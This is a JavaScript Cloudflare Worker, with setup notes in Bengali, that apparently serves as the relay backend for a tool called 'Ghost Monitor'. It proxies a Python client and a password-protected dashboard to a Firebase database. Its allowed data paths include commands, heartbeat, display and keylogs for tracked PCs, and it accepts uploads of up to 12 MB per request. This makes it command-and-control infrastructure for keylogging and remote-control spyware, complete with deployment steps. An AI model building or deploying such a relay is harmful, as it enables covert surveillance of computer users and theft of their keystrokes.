/**
 * ╔══════════════════════════════════════════════════════╗
 *  GHOST MONITOR — Cloudflare Worker
 *  Deploy করার পর শুধু ৫টা env variable দাও:
 *
 *  FIREBASE_DB_URL  = https://YOUR-PROJECT-default-rtdb.firebaseio.com
 *  FIREBASE_SECRET  = Firebase DB Secret (Project Settings → Service Accounts → Database Secrets)
 *  GHOST_SECRET     = যেকোনো random string (Python-এর token)
 *  DASHBOARD_PASS   = তোমার dashboard password
 *  SESSION_SECRET   = যেকোনো আরেকটা random string
 *
 *  KV Binding: RATE_LIMIT → create a KV namespace, bind it with var name RATE_LIMIT
 *
 *  HTML-এ:  WORKER_URL = "https://YOUR.workers.dev"
 *  Python-এ: WORKER_URL + WORKER_TOKEN = GHOST_SECRET
 * ╚══════════════════════════════════════════════════════╝
 *
 * Routes:
 *   POST /auth/login        → password check → session token
 *   GET  /auth/verify       → validate session token
 *   GET  /config            → Firebase SDK config (session required)
 *   ANY  /db/*              → Firebase REST proxy (session or GHOST_SECRET)
 *   GET  /health            → status
 */

// ── Rate limits ──
const RL = {
  IP:     { n: 300, w: 60  },  // 300 req/min per IP
  LOGIN:  { n: 10,  w: 300 },  // 10 login attempts per 5 min
  DEVICE: { n: 60,  w: 60  },  // 60 writes/min per device
};
const MAX_BODY = 12 * 1024 * 1024; // 12 MB

// Allowed Firebase paths
const ALLOWED = [
  'pcs/', 'commands/', 'heartbeat/',
  'display/', 'broadcast/', 'keylogs/',
];

// ── CORS ──
const CORS = {
  'Access-Control-Allow-Origin':  '*',
  'Access-Control-Allow-Methods': 'GET,PUT,POST,DELETE,PATCH,OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type,X-Ghost-Token,X-Session-Token',
  'Access-Control-Max-Age':       '86400',
};

const R = (data, s = 200) => new Response(
  typeof data === 'string' ? data : JSON.stringify(data),
  { status: s, headers: { 'Content-Type': 'application/json', 'Cache-Control': 'no-store', ...CORS } }
);
const E = (msg, s = 400) => R({ error: msg }, s);

// ── Rate limiter (KV) ──
async function rl(kv, key, { n, w }) {
  if (!kv) return true;
  const k = `rl:${key}`, now = Math.floor(Date.now() / 1000);
  let rec = { c: 0, s: now };
  try { rec = (await kv.get(k, { type: 'json' })) || rec; } catch {}
  if (now - rec.s > w) rec = { c: 0, s: now };
  rec.c++;
  try { await kv.put(k, JSON.stringify(rec), { expirationTtl: w + 5 }); } catch {}
  return rec.c <= n;
}

// ── HMAC session tokens ──
const enc = new TextEncoder();

async function sign(secret, msg) {
  const k = await crypto.subtle.importKey(
    'raw', enc.encode(secret), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']
  );
  const s = await crypto.subtle.sign('HMAC', k, enc.encode(msg));
  return btoa(String.fromCharCode(...new Uint8Array(s)));
}

async function makeToken(secret, ip) {
  const p = `${Date.now()}:${ip}`;
  const s = (await sign(secret, p)).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
  return `${btoa(p)}.${s}`;
}

async function checkToken(secret, token) {
  try {
    const [b64, sig] = token.split('.');
    if (!b64 || !sig) return false;
    const p   = atob(b64);
    const exp = (await sign(secret, p)).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
    if (exp.length !== sig.length) return false;
    let d = 0;
    for (let i = 0; i < exp.length; i++) d |= exp.charCodeAt(i) ^ sig.charCodeAt(i);
    if (d !== 0) return false;
    return (Date.now() - parseInt(p.split(':')[0], 10)) < 12 * 3600 * 1000; // 12h expiry
  } catch { return false; }
}

// ── Auth: Python uses X-Ghost-Token, browser uses X-Session-Token ──
async function auth(req, env) {
  const gt = req.headers.get('X-Ghost-Token');
  if (gt && env.GHOST_SECRET && gt === env.GHOST_SECRET) return true;
  const st = req.headers.get('X-Session-Token');
  if (st && env.SESSION_SECRET) return checkToken(env.SESSION_SECRET, st);
  return false;
}

// ── Firebase REST proxy ──
async function firebase(method, path, body, env) {
  const db  = env.FIREBASE_DB_URL;
  const sec = env.FIREBASE_SECRET || '';
  if (!db) throw new Error('FIREBASE_DB_URL not set');
  const u = new URL(`${db}/${path}.json`);
  if (sec) u.searchParams.set('auth', sec);
  const res  = await fetch(u.toString(), {
    method,
    headers: { 'Content-Type': 'application/json' },
    body: body || undefined,
    signal: AbortSignal.timeout(28000),
  });
  const data = await res.arrayBuffer();
  return new Response(data, {
    status: res.status,
    headers: { 'Content-Type': res.headers.get('Content-Type') || 'application/json', ...CORS, 'Cache-Control': 'no-store' },
  });
}

// ── Main handler ──
export default {
  async fetch(req, env) {
    const url    = new URL(req.url);
    const method = req.method.toUpperCase();
    const path   = url.pathname;
    const ip     = req.headers.get('CF-Connecting-IP') || '0.0.0.0';

    if (method === 'OPTIONS') return new Response(null, { status: 204, headers: CORS });

    // ── Health ──
    if (path === '/health' || path === '/') {
      return R({ ok: true, service: 'ghost-monitor-worker', ts: new Date().toISOString() });
    }

    // ── Firebase SDK config (for HTML realtime listeners) ──
    // Worker derives everything from FIREBASE_DB_URL automatically.
    // Only session-authenticated browsers get this.
    if (path === '/config' && method === 'GET') {
      const tok = req.headers.get('X-Session-Token');
      if (!tok || !(await checkToken(env.SESSION_SECRET || '', tok))) return E('Unauthorized', 401);

      // Parse project ID and other values from FIREBASE_DB_URL
      // Format: https://PROJECT-default-rtdb.firebaseio.com
      const dbUrl = env.FIREBASE_DB_URL || '';
      const match = dbUrl.match(/https:\/\/([^-]+)/);
      const proj  = match ? match[1] : '';

      return R({
        databaseURL:       dbUrl,
        projectId:         proj,
        authDomain:        `${proj}.firebaseapp.com`,
        storageBucket:     `${proj}.appspot.com`,
        // apiKey, appId, messagingSenderId — optional for DB-only SDK use
        // If you need them, add FIREBASE_API_KEY etc. as env vars
        apiKey:            env.FIREBASE_API_KEY    || '',
        appId:             env.FIREBASE_APP_ID     || '',
        messagingSenderId: env.FIREBASE_SENDER_ID  || '',
        measurementId:     env.FIREBASE_MEASURE_ID || '',
      });
    }

    // ── Login ──
    if (path === '/auth/login' && method === 'POST') {
      if (!(await rl(env.RATE_LIMIT, `login:${ip}`, RL.LOGIN)))
        return E('Too many attempts. Wait 5 minutes.', 429);
      let body;
      try { body = await req.json(); } catch { return E('Invalid JSON'); }
      if (!env.DASHBOARD_PASS) return E('DASHBOARD_PASS not configured', 500);
      if ((body.password || '') !== env.DASHBOARD_PASS) return E('Wrong password', 401);
      const token = await makeToken(env.SESSION_SECRET || 'fallback', ip);
      return R({ ok: true, token });
    }

    // ── Verify session ──
    if (path === '/auth/verify' && method === 'GET') {
      const tok = req.headers.get('X-Session-Token');
      if (!tok || !env.SESSION_SECRET) return R({ valid: false });
      return R({ valid: await checkToken(env.SESSION_SECRET, tok) });
    }

    // ── Firebase DB proxy ──
    if (path.startsWith('/db/')) {
      if (!(await rl(env.RATE_LIMIT, `ip:${ip}`, RL.IP))) return E('Rate limit exceeded', 429);
      if (!(await auth(req, env))) return E('Unauthorized', 401);

      let fbPath = path.slice(4).replace(/^\//, '').replace(/\.json$/, '');
      if (!fbPath) return E('Empty path');
      if (!ALLOWED.some(p => fbPath.startsWith(p))) return E(`Forbidden path: ${fbPath}`, 403);
      if (!['GET','PUT','POST','DELETE','PATCH'].includes(method)) return E('Method not allowed', 405);

      let body = null;
      if (['PUT','POST','PATCH'].includes(method)) {
        const raw = await req.arrayBuffer();
        if (raw.byteLength > MAX_BODY) return E('Payload too large (max 12MB)', 413);
        body = raw;
        const devId = fbPath.split('/')[1] || 'x';
        if (!(await rl(env.RATE_LIMIT, `dev:${devId}`, RL.DEVICE)))
          return E('Device rate limit exceeded', 429);
      }

      try { return await firebase(method, fbPath, body, env); }
      catch (e) { return E(`Firebase error: ${e.message}`, 502); }
    }

    return E('Not found', 404);
  }
};
